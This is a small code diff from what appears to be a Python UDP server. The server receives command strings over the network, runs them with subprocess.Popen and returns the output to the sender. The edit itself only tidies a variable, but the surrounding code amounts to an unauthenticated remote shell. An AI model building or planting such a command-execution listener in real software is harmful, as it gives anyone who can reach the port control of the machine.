@@ -130,12 +130,12 @@ def RunServer(host):
                 UDPServerSocket.sendto("Mounting Completed".encode('utf-8'), addr)
                 flag = True
             elif (flag):
-                cleanData = result = data.split(' ')
+                cleanData = data.split(' ')
                 if (cleanData[0] == 'cd'):
                     os.chdir(cleanData[1])
                     UDPServerSocket.sendto(os.getcwd().encode('utf-8'), addr)
                 else:
-                    result, err = subprocess.Popen(data.split(' '),
+                    result, err = subprocess.Popen(cleanData,
                                               stderr=subprocess.PIPE,
                                               stdout=subprocess.PIPE).communicate()
                     UDPServerSocket.sendto(result, addr)
